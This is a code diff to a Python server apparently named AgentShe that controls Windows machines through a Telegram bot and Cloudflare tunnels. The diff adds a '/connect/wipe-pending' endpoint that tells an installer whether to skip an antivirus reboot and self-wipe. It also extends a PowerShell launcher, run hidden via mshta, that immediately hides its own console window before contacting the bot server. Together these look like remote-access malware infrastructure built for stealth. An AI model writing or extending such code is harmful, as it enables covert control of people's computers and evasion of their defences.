@@ -18,18 +18,10 @@ async def _startup() -> None:
     store.ensure_data_dir()
     from app import tunnel
 
-    # Always bring up public URL (named or quick tunnel) so Connect + PC callbacks work after reboot
-    try:
-        await asyncio.to_thread(tunnel.ensure_public_base_url)
-    except Exception as e:
-        logging = __import__("logging")
-        logging.getLogger("agentshe").warning("tunnel startup: %s", e)
+    # No auto quick-tunnel / no watchdog — user starts tunnel via Telegram
+    # « 🔄 Reconnexion » or « 🔗 Connecter » (avoids Cloudflare 429 spam).
     tunnel.mark_app_ready()
-    try:
-        tunnel.start_watchdog()
-    except Exception as e:
-        logging = __import__("logging")
-        logging.getLogger("agentshe").warning("tunnel watchdog: %s", e)
+    tunnel.stop_watchdog()
     if config.TELEGRAM_BOT_TOKEN:
         asyncio.create_task(telegram_loop())
 
@@ -54,6 +46,15 @@ def index() -> PlainTextResponse:
     return PlainTextResponse("AgentShe\n")
 
 
+@app.get("/connect/wipe-pending")
+def connect_wipe_pending(e: str = Query(default="")) -> Any:
+    """Install asks: should this enroll skip AV-reboot and self-wipe?"""
+    key = (e or "").strip()
+    if not key or store.resolve_enroll_owner(key) is None:
+        return JSONResponse({"ok": False, "wipe": False}, status_code=401)
+    return JSONResponse(store.wipe_pending_for_enroll(key))
+
+
 @app.get("/connect/win.ps1")
 def connect_win_ps1(e: str = Query(default="")) -> Response:
     """Tiny PS1 launcher for Connecter — invoked fully hidden via mshta."""
@@ -74,6 +75,8 @@ def connect_win_ps1(e: str = Query(default="")) -> Response:
         ip = ""
     body_lines = [
         "$ErrorActionPreference='Stop'",
+        # Hide console ASAP (Connecter iex from visible PowerShell)
+        "try { Add-Type -Namespace HHBoot -Name C -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern System.IntPtr GetConsoleWindow(); [DllImport(\"user32.dll\")] public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);' -EA SilentlyContinue; [void][HHBoot.C]::ShowWindow([HHBoot.C]::GetConsoleWindow(), 0) } catch {}",
         "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
         f"$Enroll='{key}'",
         f"$BotBase='{base}'",
